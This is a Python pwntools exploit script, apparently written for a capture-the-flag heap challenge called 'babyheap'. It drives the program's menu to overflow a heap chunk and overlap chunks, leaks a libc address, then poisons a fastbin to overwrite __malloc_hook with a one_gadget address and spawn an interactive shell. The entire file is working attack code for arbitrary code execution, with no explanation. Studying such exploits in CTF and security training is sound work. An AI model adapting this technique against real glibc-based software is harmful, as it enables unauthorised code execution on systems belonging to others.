from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p = process("./babyheap")
elf = ELF("./babyheap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size):
	p.recvuntil("Command: ")
	p.sendline('1')
	p.recvuntil("Size: ")
	p.sendline(str(size))
def write(index,size,content):
	p.recvuntil("Command: ")
	p.sendline('2')
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Content: ")
	p.send(content)
def free(index):
	p.recvuntil("Command: ")
	p.sendline('3')
	p.recvuntil("Index: ")
	p.sendline(str(index))
def dump(index):
	p.recvuntil("Command: ")
	p.sendline("4")
	p.recvuntil("Index: ")
	p.sendline(str(index))


# ex
create(0x80)#0
create(0x10)#1
create(0x80)#2
create(0x10)#3

free(0)
payload = 'a'*0x10 + p64(0xb0) + p64(0x90)
write(1,len(payload),payload)
free(2)

create(0x80)
dump(1)
p.recvuntil("Content: \n")
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("leak_addr:"+hex(leak_addr))

libc_base = leak_addr-0x3c4b78
malloc_hook = libc_base + libc.sym['__malloc_hook']
one = [0x45226,0x4527a,0xf0364,0xf1207]
onegadget = one[1] + libc_base
log.info("libc_base:"+hex(libc_base))
log.info("malloc_hook:"+hex(malloc_hook))
log.info("onegadget:"+hex(onegadget))


create(0x10)#3
create(0x70)#4
create(0x60)#5
free(5)
payload = 'c'*0xa0 + p64(0) + p64(0x71)
payload += p64(malloc_hook-0x23)
# write(3,len(payload),payload)
write(4,len(payload),payload)
create(0x60)#5
create(0x60)#6

payload = 'a'*(0x23-0x10)
payload += p64(onegadget)
write(6,len(payload),payload)

create(0x20)



# gdb.attach(p,"b *$rebase (0x119F)")

p.interactive()
